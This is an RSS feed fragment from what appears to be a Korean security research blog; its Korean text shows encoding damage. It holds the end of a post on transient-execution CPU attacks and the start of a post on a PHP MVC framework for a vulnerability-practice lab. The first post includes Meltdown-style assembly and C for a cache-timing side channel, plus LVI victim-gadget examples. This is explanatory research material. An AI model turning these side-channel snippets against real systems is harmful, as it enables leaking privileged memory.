    &lt;span class=&quot;n&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rbx&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rdi&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rsi&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rdx&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// Do the illegal access (rdx is ptr param)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;movb&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rdx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bl&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// Duplicate result to rax&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rbx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// calculate our_buffer_lsb offset according to low nibble&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;shl&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// calculate our_buffer_msb offset according to high nibble&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;shr&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rbx&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rbx&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;shl&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rbx&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// rsi is our_buffer_lsb param&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// rdi is our_buffer_msb param&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rbx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rbx&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;rdx&lt;/code&gt;ì— íƒ€ê²Ÿ ì£¼ì†Œë¥¼ ë„£ì–´ ì½ì„ ì£¼ì†Œë¥¼ ì •í•˜ê³  4ë¹„íŠ¸ì”© ì½ì–´ L1 cacheì— ì ì¬í•œë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// ìœ„ ì–´ì…ˆì½”ë“œ&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;do_access&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;our_buffer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer_msb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;our_buffer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer_lsb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CACHE_ELEMS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;access_times_lsb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;delta&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;measure_access_time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;our_buffer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer_lsb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CACHE_ELEM_SIZE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;access_times_lsb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;access_times_msb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;delta&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;measure_access_time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;our_buffer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer_msb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CACHE_ELEM_SIZE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;access_times_msb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ê·¸ë¦¬ê³  ì ì¬ëœ  ê³µê°„ì˜ ì‹œê°„ì„ ì¬ì„œ ë©”ëª¨ë¦¬ë¥¼ ì½ëŠ”ë‹¤.&lt;/p&gt;

&lt;h1 id=&quot;load-value-injection-lvi&quot;&gt;Load Value Injection (LVI)&lt;/h1&gt;

&lt;p&gt;meltdown, spectreì´í›„ ê³„ì† ë‚˜ì˜¤ëŠ” ì·¨ì•½ì (Spectre SWAPGS, Zombieland, Foreshadow, Load Value Injection)ë“¤ì€ ê¸°ë³¸ì ìœ¼ë¡œ meltdown, spectreì˜ ê¸°ëŠ¥ì„ í™œìš©í•œ ì·¨ì•½ì ì´ë‹¤. ë¶„ê¸° ì˜ˆì¸¡, ë¹„ìˆœì°¨ì‹¤í–‰ìœ¼ë¡œ ì„ì˜ ì˜ì—­ì„ ì½ê³  ì‚¬ì´ë“œ ì±„ë„ ê³µê²©ìœ¼ë¡œ íŠ¸ë¦¬ê±°í•œë‹¤.&lt;/p&gt;

&lt;p&gt;ë‹¤ë¥¸ ì´ë¦„ì´ ë¶™ì–´ ìˆëŠ” ì·¨ì•½ì ë“¤ì€ ì‚¬ì‹¤ meltdown, spectreë¼ëŠ” ì·¨ì•½ì ì„ ìƒì†í•œë‹¤ê³  ë´ë„ ëœë‹¤. í™œìš©í•˜ëŠ” ë°©ì•ˆì— ë”°ë¼ ìƒˆë¡œìš´ ì·¨ì•½ì ìœ¼ë¡œ ì´ë¦„ì„ ë¶™íˆëŠ” ê²ƒì´ë‹¤. ê·¸ì¤‘ ê°€ì¥ ìµœê·¼ì— ë‚˜ì˜¨ LVIì·¨ì•½ì ë§Œ ê°„ëµí•˜ê²Œ ì†Œê°œí•œë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/jo0702.png&quot; alt=&quot;/assets/jo0702.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;LVIëŠ” attackerê°€ execution engineë‚´ì— ìˆëŠ” ë²„í¼ì— ì§ì ‘ ê°’ì„ ë„£ê³ , victimì´ ë¹„ìˆœì°¨ ì‹¤í–‰ìœ¼ë¡œ ì½ì„ ë•Œ ê³µê²©ìê°€ ë„£ì€ ê°’ì„ ì½ê²Œë” í•˜ëŠ” ê³µê²©ì´ë‹¤. ì˜ˆë¥¼ë“¤ë©´ victimì˜ ì½”ë“œëŠ” ì•„ë˜ì™€ ê°™ì´ ëœë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;           &lt;span class=&quot;c1&quot;&gt;// Prime attacker data 'a' in a store buffer&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;           &lt;span class=&quot;c1&quot;&gt;// Load faults, attacker data 'a' forwarded to 'd'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;           &lt;span class=&quot;c1&quot;&gt;// Load secret from attacker-controlled address 'd'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;oracle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4096&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Transmit secret over covert channel&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ë§Œì•½ victimì˜ íë¦„ì„ ì œì–´í•˜ê³  ì‹¶ë‹¤ë©´ ì´ëŸ° ì½”ë“œê°€ ëœë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;    	&lt;span class=&quot;c1&quot;&gt;// Prime attacker data 'a' in a store buffer&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;    	&lt;span class=&quot;c1&quot;&gt;// Load faults, attacker data 'a' forwarded to 'd'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;       	&lt;span class=&quot;c1&quot;&gt;// Branch to attacker-controlled address `d&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ì´ëŸ¬í•œ ì½”ë“œ ê°€ì ¯ë“¤ì´ victimì— ìˆì–´ì•¼ í•˜ê¸° ë•Œë¬¸ì— ê³µê²©ì´ ê¹Œë‹¤ë¡­ë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;VictimFunctionTsx&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PROC&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mfence&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;xbegin&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;__abort_tsx&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mov&lt;/span&gt;         &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;0000000000000000&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;h&lt;/span&gt;      &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;jmp&lt;/span&gt;         &lt;span class=&quot;n&quot;&gt;qword&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;             &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;xend&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;__abort_tsx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mfence&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;VictimFunctionTsx&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ENDP&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ìœ„ ì½”ë“œëŠ” pocì— ë‚˜ì˜¨ victimì´ íë¦„ì œì–´ë¥¼ í•˜ëŠ” ì½”ë“œì´ë‹¤. [0]ì„ L1 cacheì™€ L2 cacheê°€ í†µì‹ í•˜ëŠ” ë²„í¼ì¸ Line Fill Bufferë¥¼ ì˜¤ì—¼ì‹œí‚´ìœ¼ë¡œì„œ ì›í•˜ëŠ” ë¶„ê¸°ë¡œ ë›°ê²Œ ë§Œë“ ë‹¤.&lt;/p&gt;

&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;

&lt;p&gt;meltdown, spectreê°€ ë‚˜ì˜¨ ë’¤ Transient executionì·¨ì•½ì ì´ ë” ë§ì´ ë°œê²¬ë˜ì–´ ìƒˆë¡œìš´ ê¸°ëŠ¥ì´ë‚˜ ë‹¤ë¥¸ cpuêµ¬ì¡°, ë‹¤ë¥¸ í•˜ë“œì›¨ì–´ì—ì„œ ìƒˆë¡­ê²Œ ë°œìƒí•œ ì·¨ì•½ì ì„ ê¸°ëŒ€í•˜ê³  ì¡°ì‚¬ë¥¼ í–ˆë‹¤.&lt;/p&gt;

&lt;p&gt;í•˜ì§€ë§Œ Transient execution ì·¨ì•½ì ì€ ëª¨ë‘ ë¹„ìˆœì°¨ì‹¤í–‰, ë¶„ê¸°ì˜ˆì¸¡ì— ê¸°ë°˜ì„ ë‘ê³  ìˆìœ¼ë©° pagingì„ ì´ìš©í•œë‹¤ë˜ê°€, kernel í•¨ìˆ˜, instructionì„ ì´ìš©í•œë‹¤ê°€, cpu bufferë¥¼ ì´ìš©í•´ íŠ¸ë¦¬ê±° í•˜ëŠ”ê²ƒ ë§Œ ë‹¤ë¥´ë‹¤.&lt;/p&gt;

&lt;p&gt;ë”°ë¼ì„œ cpu êµ¬ì¡°ì— ìˆëŠ” ì·¨ì•½ì ì€ ì´í›„ë¡œ ë” ë°œê²¬ëœê²Œ ì—†ë‹¤.&lt;/p&gt;

&lt;h1 id=&quot;reference&quot;&gt;reference&lt;/h1&gt;

&lt;p&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2018/01/reading-privileged-memory-with-side.html&quot;&gt;https://googleprojectzero.blogspot.com/2018/01/reading-privileged-memory-with-side.html&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Transient_execution_CPU_vulnerability&quot;&gt;https://en.wikipedia.org/wiki/Transient_execution_CPU_vulnerability&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://meltdownattack.com/meltdown.pdf&quot;&gt;https://meltdownattack.com/meltdown.pdf&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://foreshadowattack.eu/foreshadow.pdf&quot;&gt;https://foreshadowattack.eu/foreshadow.pdf&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://software.intel.com/security-software-guidance/insights/deep-dive-load-value-injection#universalgadget&quot;&gt;https://software.intel.com/security-software-guidance/insights/deep-dive-load-value-injection#universalgadget&lt;/a&gt;&lt;/p&gt;
</description>
        <pubDate>Wed, 01 Jul 2020 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/2020-07-01/Transient-execution-attacks</link>
        <guid isPermaLink="true">http://localhost:4000/2020-07-01/Transient-execution-attacks</guid>
        
        <category>etc</category>
        
        
      </item>
    
      <item>
        <title>PHP MVC íŒ¨í„´</title>
        <description>&lt;p&gt;ë¼ì˜¨í™”ì´íŠ¸í–‡ í•µì‹¬ì—°êµ¬íŒ€ ìœ ì„ ë™&lt;/p&gt;

&lt;h2 id=&quot;introduce&quot;&gt;[Introduce]&lt;/h2&gt;

&lt;p&gt;í”„ë¡œê·¸ë˜ë° ì„¤ê³„ ê³¼ì •ì—ì„œ MVC íŒ¨í„´ì„ ì‚¬ìš©í•˜ë©´ ë¹ ë¥´ê³  ì‰½ê³  í¸í•˜ê²Œ ê´€ë¦¬ë¥¼ í•  ìˆ˜ ìˆì–´, PHP ì–¸ì–´ ê¸°ë°˜ MVC íŒ¨í„´ì„ ì—°êµ¬í•´ë³´ì•˜ìŠµë‹ˆë‹¤. PHP MVC íŒ¨í„´ì´ ì ìš©ëœ ê³µê°œëœ ì˜¤í”ˆ ì†ŒìŠ¤ í”„ë ˆì„ ì›Œí¬ëŠ” â€œì½”ë“œ ì´ê·¸ë‚˜ì´í„°â€, â€œë¼ë¼ë²¨â€ ë“±ìœ¼ë¡œ í¬ê²Œ ë¶„ë¥˜í•  ìˆ˜ ìˆìœ¼ë‚˜ í•´ë‹¹ í”„ë ˆì„ì›Œí¬ë¥¼ ì‚¬ìš©í•˜ê¸° ì „ ì§ì ‘ í”„ë ˆì„ì›Œí¬ë¥¼ ì œì‘í•˜ì—¬ ì›ë¦¬ë¥¼ êµ¬í˜„í•´ë³´ê³  ì‹¶ì–´ ì—°êµ¬ë¥¼ ì§„í–‰í•˜ê²Œ ë˜ì—ˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;ë³¸ ì—°êµ¬ëŠ” â€œëª¨ì˜ ì›¹ ì·¨ì•½ì  ì§„ë‹¨ ì‹¤ìŠµìš©  ì›¹ í”„ë ˆì„ì›Œí¬â€ë¥¼ ê°œë°œí•˜ê¸° ìœ„í•´ ì§„í–‰í•˜ì˜€ìœ¼ë©°, ê³µê°œëœ í”„ë ˆì„ì›Œí¬ëŠ” ê¸°ë³¸ì ìœ¼ë¡œ ì‹œíì–´ ì½”ë”©ì´ íƒ‘ì¬ë˜ì–´ ìˆì–´ ì§ì ‘ í”„ë ˆì„ì›Œí¬ë¥¼ ì œì‘í•˜ì—¬ êµ¬í˜„í•˜ê²Œ ë¨.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;ë³´ë‹¤ êµ¬ì²´ì ì¸ ì›ë¦¬ëŠ” ì¶”í›„ì— gitlab í†µí•˜ì—¬ ì½”ë“œë¥¼ ê³µê°œí•˜ë„ë¡ í•˜ê² ìŠµë‹ˆë‹¤. (í˜„ì¬ Privateìœ¼ë¡œ ì§„í–‰)&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;mvc-pattern&quot;&gt;[MVC Pattern]&lt;/h2&gt;

&lt;hr /&gt;

&lt;ul&gt;
  &lt;li&gt;MVCì˜ ì•½ìëŠ” â€œModelâ€, â€œViewâ€, â€œcontrollerâ€ì´ë©° ì†Œí”„íŠ¸ì›¨ì–´ ë””ìì¸ íŒ¨í„´ì´ë¼ê³  í•©ë‹ˆë‹¤.&lt;/li&gt;
  &lt;li&gt;Model
â†’ â€œì–´ë–¤ ê±¸ í• ì§€ ì •ì˜â€, ë°ì´í„° ì²˜ë¦¬(Ex. ë¡œê·¸ì¸, ê²€ì¦),  ë¡œì§ ìˆ˜í–‰&lt;/li&gt;
  &lt;li&gt;View
â†’ ì‚¬ìš©ìì—ê²Œ ë³´ì—¬ì£¼ëŠ” í™”ë©´ (ì‹œê°ì ì¸ í‘œí˜„ì„ ë‹´ë‹¹í•˜ë©°, Ex HTML, CSS)&lt;/li&gt;
  &lt;li&gt;Controller
â†’ ì‚¬ìš©ìì˜ ìš”ì²­ì„ ë°›ì•„ â€œì–´ë–»ê²Œ ì²˜ë¦¬ í• ì§€ ì •ì˜â€, Model í˜¸ì¶œ&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ì¦‰, ì‚¬ìš©ìê°€ ë¡œê·¸ì¸ í˜ì´ì§€ì— ë¡œê·¸ì¸ì„ ì‹œë„í•œë‹¤ê³  í•˜ë©´
â€œControllerâ€ëŠ” ë¡œê·¸ì¸ í˜ì´ì§€ì˜ ë¡œì§ì„ â€œModelâ€ì—ì„œ ê°€ì ¸ì™€ ë¡œê·¸ì¸ ì¸ì¦ ë¡œì§ì„ ìˆ˜í–‰í•˜ê³ , ì„±ê³µ ë˜ëŠ” ì‹¤íŒ¨ì— ë§ëŠ” â€œViewâ€ë¥¼ ê°€ì ¸ì™€ ì‹œê°ì ìœ¼ë¡œ ì‚¬ìš©ìì—ê²Œ í‘œí˜„í•œë‹¤.&lt;/p&gt;

&lt;h2 id=&quot;mvc-pattern---ì ìš©ì „&quot;&gt;[MVC Pattern - ì ìš©ì „]&lt;/h2&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;img src=&quot;/assets/dong0700.png&quot; alt=&quot;/assets/dong0700.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ë³¸ ì‚¬ì§„ ì† ì½”ë“œëŠ” â€œëª¨ì˜ ì›¹ ì·¨ì•½ì  ì§„ë‹¨  ì‹¤ìŠµìš© ì†”ë£¨ì…˜â€ì´ë©° MVC ë¯¸ì ìš©ëœ ì½”ë“œì´ë‹¤.&lt;/p&gt;

&lt;p&gt;ìš°ì„  ì‚¬ì§„ ì†ë§Œ ë´ë„ ê²Œì‹œíŒì´ ì¶”ê°€ë  ë•Œë§ˆë‹¤ 3ê°œì˜ íŒŒì¼(list, down,write)ê°€ ì¶”ê°€ë˜ë¯€ë¡œ ì§€ì €ë¶„í•˜ê²Œ ë³´ì¸ë‹¤.&lt;/p&gt;

